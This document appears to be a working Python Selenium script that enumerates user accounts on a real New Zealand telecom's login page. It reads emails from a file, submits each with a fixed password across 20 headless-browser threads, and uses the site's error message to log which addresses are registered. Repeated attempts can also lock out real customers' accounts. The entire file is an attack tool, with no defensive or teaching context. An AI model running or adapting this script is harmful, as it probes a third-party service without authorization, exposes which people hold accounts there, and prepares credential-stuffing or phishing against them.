from selenium import webdriver
from shutil import which
import threading

from selenium.webdriver.chrome.options import Options

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_path = which("chromedriver")

threadLock = threading.Lock()
threads = []

write_file = open("done.txt", "w")

number_of_threads = 20
threadLimiter = threading.BoundedSemaphore(number_of_threads)


class myThread(threading.Thread):
    def __init__(self, email):
        threading.Thread.__init__(self)
        self.email = email

    def run(self):
        threadLimiter.acquire()

        try:

            driver = webdriver.Chrome(executable_path=chrome_path, options=chrome_options)
            driver.get("https://www.skinny.co.nz/Security/login")
            username_field = driver.find_element_by_id("MemberLoginForm_LoginForm_Email")
            password_field = driver.find_element_by_id("MemberLoginForm_LoginForm_Password")
            username_field.send_keys(self.email)
            password_field.send_keys("abcABC123@")

            login_button = driver.find_element_by_id("MemberLoginForm_LoginForm_action_doLogin")
            login_button.click()

            error_field = driver.find_element_by_id("MemberLoginForm_LoginForm_error")
            text = error_field.get_attribute('innerText')

            text = text.strip()
            registered_text = "The provided details don't seem to be correct."
            error_text = "Your account has been temporarily disabled because of too many failed attempts at logging in"

            if registered_text in text:
                print(f"{self.email} > Registered Account")
                threadLock.acquire()
                write_file.write(f"{self.email}\n")
                threadLock.release()

            elif error_text in text:
                print(
                    f"{self.email} > Your account has been temporarily disabled.")

            else:
                print(f"{self.email} > Not Registered Account")

            driver.quit()

        except:
            pass

        finally:
            threadLimiter.release()



f = open("input.txt")
emails = f.readlines()

for email in emails:
    email = email.strip()
    if len(email) == 0:
        continue

    thread = myThread(email)
    thread.start()
    threads.append(thread)

for t in threads:
    t.join()

write_file.close()
